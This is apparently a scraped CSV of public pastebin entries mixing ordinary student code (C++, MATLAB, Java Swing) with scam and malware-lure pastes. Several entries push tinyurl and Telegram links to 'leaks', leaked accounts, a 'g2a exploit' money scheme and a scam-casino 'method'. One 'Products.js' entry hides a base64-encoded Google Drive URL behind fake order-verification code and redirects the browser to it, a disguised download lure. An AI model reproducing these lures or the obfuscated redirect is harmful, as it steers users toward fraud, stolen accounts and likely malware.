id,title,username,language,date,content
zS13frxT,Products.js,johny1234567,PHP,Wednesday 7th of May 2025 12:54:10 PM CDT,481337 - check it out at https://tinyurl.com/nulledbb
AzkFekyK,Make $1000 15-MINUTES (BEGINNER) OV,kosson,JavaScript,Wednesday 7th of May 2025 12:52:38 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

NXt8KzwWU1
"
KuRLxvPE,Scam Casinos and Stores,navrajkhunger,JavaScript,Wednesday 7th of May 2025 12:51:28 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 86938
ZuiFCnbG,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Wednesday 7th of May 2025 12:50:40 PM CDT,04863 Accounts Posted On https://t.me/leakzbyeminem
V1P3UP9N,Untitled,Josif_tepe,C++,Wednesday 7th of May 2025 12:50:09 PM CDT,"#include <iostream>

using namespace std;
class Korisnik {
private:
    char ime[20];
    float tezini[30];
    int br_merenja;
public:
    Korisnik() {
        strcpy(ime, """");
        br_merenja = 1;
        tezini[0] = 60;
    }
    Korisnik(char * _ime, float * _tezini, int _br_merenje) {
        br_merenja = _br_merenje;
        strcpy(ime, _ime);
        for(int i = 0; i < br_merenja; i++) {
            tezini[i] = _tezini[i];
        }
        
    }
    Korisnik(const Korisnik & tmp) {
        br_merenja = tmp.br_merenja;
        strcpy(ime, tmp.ime);
        for(int i = 0; i < br_merenja; i++) {
            tezini[i] = tmp.tezini[i];
        }
    }
    ~Korisnik() {}
    
    void pechati() {
        cout << ime << "" "" << br_merenja << endl;
        for(int i = 0; i < br_merenja; i++) {
            cout << tezini[i] << "" "" ;
        }
        cout << endl;
    }
    void dodadiMerenje(float m) {
        float tmp[br_merenja];
        for(int i = 0; i < br_merenja; i++) {
            tmp[i] = tezini[i];
        }
        tezini[0] = m;
        br_merenja++;
        for(int i = 1; i < br_merenja; i++) {
            tezini[i] = tmp[i - 1];
        }
    }
    void brishiMerenje() {
        float tmp[br_merenja];
        for(int i = 1; i < br_merenja; i++) {
            tmp[i - 1] = tezini[i];
        }
        br_merenja--;
        for(int i = 0; i < br_merenja; i++) {
            tezini[i] = tmp[i];
        }
    }
};

int main()
{
    float niza[4] = {10.5, 4.6, 9.4, 5.8};
    Korisnik k(""Petar"", niza, 4);
    k.pechati();
    k.dodadiMerenje(75.3);
    k.pechati();
    k.brishiMerenje();
    k.pechati();
    
    return 0;
}
"
jT9PhMUP,lcm,MOOOSE21,MatLab,Wednesday 7th of May 2025 12:49:40 PM CDT,"C= [11, 13, 17, 14; 16, 18, 14, 10; 21, 24, 13, 10];
S= [8 5 9];
D= [8 7 5 4];
[m ,n]= size(C);

if(sum(S)==sum(D))
    disp('Balanced');
else if(sum(S)<sum(D))
        C(end+1,:)=zeros(1,n);
        S(end+1)= sum(D)- sum(S);
        s=sum(D);

else 
     C(:,end+1)=zeros(m,1);
     D(end+1)= sum(S)- sum(D);
     s=sum(C);
end
end
table =C;
table= [table , S(:)];
mD = [D, s];  
table= [table ; mD];
var ={'D1','D2','D3', 'D4', 'Supply' };
disp(array2table(table, 'VariableNames', var));
X=C;
Ci=C;
while any(S~=0)|| any(D~=0)
    mini = min(C(:));
    [r, c]= find(C==mini);
    y = min(S(r), D(c));
    [alloc, ind]= max(y);
    rr= r(ind);
    cc= c(ind);
    X(rr, cc)= alloc;
    S(rr)= S(rr)- alloc;
    D(cc)= D(cc)-alloc;
    C(rr, cc)= inf;


end
table =X;
table= [table , S(:)];
mD = [D, s];  
table= [table ; mD];
var ={'D1','D2','D3', 'D4', 'Supply' };
disp(array2table(table, 'VariableNames', var));

Cost = Ci.*X;
[m, n]= size(X);
if nnz(X)==m+n-1
    disp('Non-degenerate initial BFS');
else 
    disp('degenerate initial BFS');
end
final = sum(Cost(:));
disp(""Total Cost is "");
disp(final);"
PABshB2e,Aporte 6 - Funcion listar (agregar panel y ordenar lista) - Principal (habilitar lineas comentadas),julibar,Java,Wednesday 7th of May 2025 12:47:54 PM CDT,"//archivo PanelListadoPeliculas.java
		scrollPane = new JScrollPane();
		GridBagConstraints gbc_scrollPane = new GridBagConstraints();
		scrollPane.setPreferredSize(new Dimension(220, 160));
		gbc_scrollPane.gridheight = 3;
		gbc_scrollPane.gridwidth = 3;
		gbc_scrollPane.insets = new Insets(0, 0, 5, 5);
		gbc_scrollPane.fill = GridBagConstraints.BOTH;
		gbc_scrollPane.gridx = 1;
		gbc_scrollPane.gridy = 1;
		add(scrollPane, gbc_scrollPane);
		
		
        listaPeliculasJL = new JList<Pelicula>();
        scrollPane.setViewportView(listaPeliculasJL);
        
        JLabel lblPeliculas = new JLabel(""Peliculas  "");
        lblPeliculas.setFont(new Font(""Tahoma"", Font.BOLD, 12));
        GridBagConstraints gbc_lblPeliculas = new GridBagConstraints();
        gbc_lblPeliculas.anchor = GridBagConstraints.EAST;
        gbc_lblPeliculas.insets = new Insets(0, 0, 5, 5);
        gbc_lblPeliculas.gridx = 0;
        gbc_lblPeliculas.gridy = 2;
        add(lblPeliculas, gbc_lblPeliculas);
	}	
		
		
		public void setDefaultListModel(DefaultListModel<Pelicula> listPeliculas) {
        TreeSet<Pelicula> peliculasOrdenadas = new TreeSet<>(Comparator.comparing(p -> p.getNombre().toLowerCase()));

        for (int i = 0; i < listPeliculas.size(); i++) {
            peliculasOrdenadas.add(listPeliculas.get(i));
        }

        DefaultListModel<Pelicula> modeloOrdenado = new DefaultListModel<>();
        for (Pelicula p : peliculasOrdenadas) {
            modeloOrdenado.addElement(p);
        }

        this.listPeliculas = modeloOrdenado;
        listaPeliculasJL.setModel(this.listPeliculas);
    }
}



//archivo Principal.java dentro del constructor arriba de contentPane = new JPanel();
//agregar SOLO las lineas comentadas, el resto ya esta, solo lo dejo para contexto

JMenuItem MenuItemAgregar = new JMenuItem(""Agregar""); 
		MenuItemAgregar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				contentPane.removeAll(); 
			//	PanelIngresoPeliculas Ingreso = new PanelIngresoPeliculas(); 	
			//Ingreso.setDefaultListModel(listPeliculas);
			//contentPane.add(Ingreso);
			contentPane.repaint();
			contentPane.revalidate();							
			}
		});
		JmPeliculas.add(MenuItemAgregar);
		
		JMenuItem MenuItemListar = new JMenuItem(""Listar"");
		MenuItemListar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				contentPane.removeAll();
			//	PanelListadoPeliculas Lista = new PanelListadoPeliculas();
			//	Lista.setDefaultListModel(listPeliculas);
			//	contentPane.add(Lista);
				contentPane.repaint();
				contentPane.revalidate();
			}
		});		
		JmPeliculas.add(MenuItemListar);

		
"
R5bL3Sin,Products.js,Epiphemeral,JavaScript,Wednesday 7th of May 2025 12:47:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63025/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wtGF2ZTF,Untitled,drakon-firestone,C++,Wednesday 7th of May 2025 12:47:25 PM CDT,"    int tab[] = {-4, 10, -12, 3, 25, -1, 30};
    int size = 8;

    cout << find_max(tab, size) << endl;"
Cnk9mBiM,"Aporte 5 - Panel Agregar (label genero, combobox y boton aceptar) - Panel Listado (dibuja la grilla)",julibar,Java,Wednesday 7th of May 2025 12:47:12 PM CDT,"	//archivo PanelAgregarPelicula.java
	//va dentro de la funcion public void dibujarPanel(), debajo del aporte 4
		JLabel lblGenero = new JLabel(""Genero"");
		lblGenero.setFont(fuentePred);
		GridBagConstraints gbc_lblGenero = new GridBagConstraints();
		gbc_lblGenero.insets = new Insets(0, 0, 5, 5);
		gbc_lblGenero.gridx = 1;
		gbc_lblGenero.gridy = 3;
		gbc_lblGenero.fill = GridBagConstraints.HORIZONTAL;
		add(lblGenero, gbc_lblGenero);
		
		cbGenero = new JComboBox<Categoria>();
		GridBagConstraints gbc_cbGenero = new GridBagConstraints();
		cbGenero.setFont(fuentePred);
		cbGenero.addItem(new Categoria(""Seleccione un genero""));
		cbGenero.addItem(new Categoria(""Terror""));
		cbGenero.addItem(new Categoria(""Accion""));
		cbGenero.addItem(new Categoria(""Suspenso""));
		cbGenero.addItem(new Categoria(""Romantica""));				
		gbc_cbGenero.insets = new Insets(0, 0, 5, 5);
		gbc_cbGenero.fill = GridBagConstraints.HORIZONTAL;
		gbc_cbGenero.gridx = 3;
		gbc_cbGenero.gridy = 3;
		add(cbGenero, gbc_cbGenero);
		
		btnNewButton = new JButton(""Aceptar"");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
				if(!txtNombre.getText().isEmpty()) {	
					if(cbGenero.getSelectedIndex() != 0) 	{
						Categoria seleccion = (Categoria) cbGenero.getSelectedItem(); 
						Pelicula Nueva = new Pelicula(txtNombre.getText().toString(),seleccion.getNombre());
						listPeliculas.addElement(Nueva);	
						txtNombre.setText("""");
						lblProxID.setText(String.valueOf(Pelicula.getProxId()));
						cbGenero.setSelectedIndex(0);	
						} 
					else
						{
						 JOptionPane.showMessageDialog(null, ""Debe seleccionar un genero"");
						}
					}
				else
					{
						JOptionPane.showMessageDialog(null, ""Debe ingresar un nombre"");
					}				
				
			}
		});
		btnNewButton.setBackground(new Color(129, 208, 252));
		btnNewButton.setFont(fuentePred);
		GridBagConstraints gbc_btnNewButton = new GridBagConstraints();
		gbc_btnNewButton.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton.gridx = 1;
		gbc_btnNewButton.gridy = 5;
		add(btnNewButton, gbc_btnNewButton);				

	}
	
	public void setDefaultListModel(DefaultListModel<Pelicula> listPeliculaslRecibida) {
		this.listPeliculas = listPeliculaslRecibida;
	}

}


//archivo PanelListadoPeliculas.java

package Paquete;


import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.util.Comparator;
import java.util.TreeSet;

import javax.swing.DefaultListModel;
import javax.swing.JList;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JLabel;

import java.awt.Dimension;
import java.awt.Font;

public class PanelListadoPeliculas extends JPanel {

	private static final long serialVersionUID = 1L;
	
	private JScrollPane scrollPane;
    private JList<Pelicula> listaPeliculasJL;
    private DefaultListModel<Pelicula> listPeliculas;

    public PanelListadoPeliculas() {
        dibujarPanel();
        
    }

    public void dibujarPanel() {    	
		
		GridBagLayout gridBagLayout = new GridBagLayout();
		gridBagLayout.columnWidths = new int[]{80, 0, 0, 0, 30, 0};
		gridBagLayout.rowHeights = new int[]{30, 63, 0, 0, 30, 0};
		gridBagLayout.columnWeights = new double[]{0.0, 1.0, 0.0, 1.0, 0.0, Double.MIN_VALUE};
		gridBagLayout.rowWeights = new double[]{0.0, 0.0, 0.0, 1.0, 0.0, Double.MIN_VALUE};
		setLayout(gridBagLayout);
		

	// aca va el aporte 6
        
    }

    "
ub6fMGSa,"Aporte 4 - Panel del menu Agregar - Punto 4 parte de agregar (labels [ID, Nombre], textbox Nombre)",julibar,Java,Wednesday 7th of May 2025 12:46:23 PM CDT,"//archivo PanelAgregarPelicula.java

package Paquete;

import java.awt.Color;
import java.awt.Font;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class PanelIngresoPeliculas extends JPanel {

	private static final long serialVersionUID = 1L;

	private Font fuentePred;
	private JTextField txtNombre;
	private JComboBox<Categoria> cbGenero;
	private JButton btnNewButton;
	private DefaultListModel<Pelicula> listPeliculas;

	public PanelIngresoPeliculas() {
		dibujarPanel();
}
	
	public void dibujarPanel() {
					
		
		fuentePred = new Font(""Tahoma"", Font.PLAIN, 16);
			
		GridBagLayout gbl_contentPane = new GridBagLayout();
		gbl_contentPane.columnWidths = new int[]{50, 150, 0, 240, 50, 0};
		gbl_contentPane.rowHeights = new int[]{40, 39, 30, 30, 30, 30, 80};
		gbl_contentPane.columnWeights = new double[]{0.0, 1.0, 0.0, 1.0, 1.0, Double.MIN_VALUE};
		gbl_contentPane.rowWeights = new double[]{0.0, 1.0, 0.0, Double.MIN_VALUE};
		setLayout(gbl_contentPane);
		
		JLabel lbID = new JLabel(""ID"");
		lbID.setFont(fuentePred);
		GridBagConstraints gbc_lbID = new GridBagConstraints();
		gbc_lbID.insets = new Insets(0, 0, 5, 5);
		gbc_lbID.gridx = 1;
		gbc_lbID.gridy = 1;
		gbc_lbID.fill = GridBagConstraints.HORIZONTAL;
		add(lbID, gbc_lbID);
						
		JLabel lblNombre = new JLabel(""Nombre"");
		lblNombre.setFont(fuentePred);
		GridBagConstraints gbc_lblNombre = new GridBagConstraints();
		gbc_lblNombre.insets = new Insets(0, 0, 5, 5);
		gbc_lblNombre.gridx = 1;
		gbc_lblNombre.gridy = 2;
		gbc_lblNombre.fill = GridBagConstraints.HORIZONTAL;
		add(lblNombre, gbc_lblNombre);
		
		JLabel lblProxID = new JLabel("""");
		lblProxID.setFont(fuentePred);
		lblProxID.setText(String.valueOf(Pelicula.getProxId()));
		GridBagConstraints gbc_lblProxID = new GridBagConstraints();
		gbc_lblProxID.insets = new Insets(0, 0, 5, 5);
		gbc_lblProxID.gridx = 3;
		gbc_lblProxID.gridy = 1;
		gbc_lblProxID.fill = GridBagConstraints.HORIZONTAL;
		add(lblProxID, gbc_lblProxID);
		
		txtNombre = new JTextField();
		txtNombre.setFont(fuentePred);
		GridBagConstraints gbc_txtNombre = new GridBagConstraints();
		gbc_txtNombre.insets = new Insets(0, 0, 5, 5);
		gbc_txtNombre.fill = GridBagConstraints.HORIZONTAL;
		gbc_txtNombre.gridx = 3;
		gbc_txtNombre.gridy = 2;
		gbc_txtNombre.fill = GridBagConstraints.HORIZONTAL;
		add(txtNombre, gbc_txtNombre);
		txtNombre.setColumns(10);
		
		//...aca va el aporte 5
		
		}
		"
TcZQEKwf,free hf ebooks,HamdanIsAwesome,JavaScript,Wednesday 7th of May 2025 12:46:16 PM CDT,985867 - check it out at http://tinyurl.com/new2025may
KiKJPbFx,EARN $900 INSTANTLY 2025 EI,wasanshahahah,JavaScript,Wednesday 7th of May 2025 12:45:30 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

rYy43I4Ijk
"
